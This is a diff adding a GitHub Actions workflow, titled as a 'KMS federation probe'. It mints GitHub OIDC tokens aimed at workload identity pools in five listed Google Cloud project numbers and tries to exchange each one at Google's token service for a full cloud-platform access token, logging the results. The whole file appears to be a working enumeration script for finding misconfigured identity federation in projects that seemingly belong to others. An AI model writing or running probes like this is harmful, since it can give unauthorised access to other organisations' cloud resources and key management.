@@ -1,0 +1,25 @@
+name: KMS federation probe 3
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe3:
+    runs-on: ubuntu-latest
+    steps:
+      - name: gke-pool-existence
+        run: |
+          set -u
+          for NUM in 969676484546 724129488863 892124123196 256538497032 350330337821; do
+            AUD="//iam.googleapis.com/projects/$NUM/locations/global/workloadIdentityPools/synapse-production.svc.id.goog"
+            TOK=$(curl -sS --max-time 30 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$AUD")" | jq -r '.value // empty')
+            OUT=$(curl -sS --max-time 30 -w '\nHTTP=%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" --data-urlencode "audience=$AUD" \
+              -d "scope=https://www.googleapis.com/auth/cloud-platform" \
+              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" --data-urlencode "subject_token=$TOK")
+            echo "GKEPOOL $NUM synapse-production.svc.id.goog :: $(printf '%s' "$OUT" | tr '\n' ' ' | head -c 260)"
+            sleep 0.3
+          done
+          echo "=== done3 ==="
